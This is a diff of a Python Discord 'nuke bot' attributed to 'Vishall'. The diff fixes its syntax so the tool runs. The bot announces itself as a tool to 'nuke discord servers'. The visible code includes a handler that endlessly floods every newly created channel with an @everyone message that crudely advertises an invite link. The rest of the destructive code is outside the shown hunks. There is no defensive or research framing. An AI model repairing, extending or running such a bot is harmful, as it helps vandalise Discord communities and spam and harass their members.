@@ -5,14 +5,14 @@ from discord import Permissions
 from colorama import Fore, Style
 import asyncio
 
-SPAM_CHANNEL = [FUCKED BY VISHALL XD]
-SPAM_MESSAGE = [@everyone FUCKING JOIN THIS SERVER FOR RECOVERY https://discord.gg/UFvjK5Uy5e]
+SPAM_CHANNEL = ["Fucked by Vishall XD"]
+SPAM_MESSAGE = ["@everyone Joining a recovery server: https://discord.gg/UFvjK5Uy5e"]
 
 client = commands.Bot(command_prefix=",")
 
 @client.event
 async def on_ready():
-     print(Fore.MAGENTA + 'VISHALS Nuke Bot is on!! Do (Prefix) to nuke discord servers!!' + Fore.RESET)
+    print(Fore.MAGENTA + 'VISHALS Nuke Bot is on!! Do (Prefix) to nuke discord servers!!' + Fore.RESET)
       await 
 client.change_presence(activity=discord.Game(name="BIO 
 HERE"))
@@ -99,4 +99,4 @@ async def on_guild_channel_create(channel):
     while True:
         await channel.send(random.choice(SPAM_MESSAGE))
 
-client.run(“BOT TOKEN HERE")
+client.run("YOUR_BOT_TOKEN")
